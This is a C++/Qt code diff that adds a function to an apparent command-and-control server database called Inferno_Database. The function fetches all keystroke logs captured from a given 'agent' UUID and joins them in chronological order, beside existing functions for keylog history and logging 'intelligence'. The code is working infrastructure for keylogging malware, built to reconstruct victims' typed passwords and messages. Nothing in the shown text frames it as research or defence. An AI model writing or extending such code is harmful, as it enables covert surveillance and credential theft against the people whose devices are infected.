@@ -364,6 +364,26 @@ QStringList Inferno_Database::getKeylogHistory(const QString& uuid, int limit) {
     return history;
 }
 
+QString Inferno_Database::getRawKeylogsChronological(const QString& uuid) {
+    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return "";
+    QSqlQuery query(m_db);
+    query.prepare("SELECT k.data FROM keylogs k "
+                  "JOIN agents a ON a.id = k.agent_id "
+                  "WHERE a.uuid = :uuid "
+                  "ORDER BY k.timestamp ASC");
+    query.bindValue(":uuid", uuid);
+
+    QString fullLog;
+    if (query.exec()) {
+        while (query.next()) {
+            fullLog += query.value(0).toString();
+        }
+    } else {
+        qDebug() << "[Database] Keylog chronological history fetch error:" << query.lastError().text();
+    }
+    return fullLog;
+}
+
 bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context) {
     if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
     QSqlQuery query(m_db);
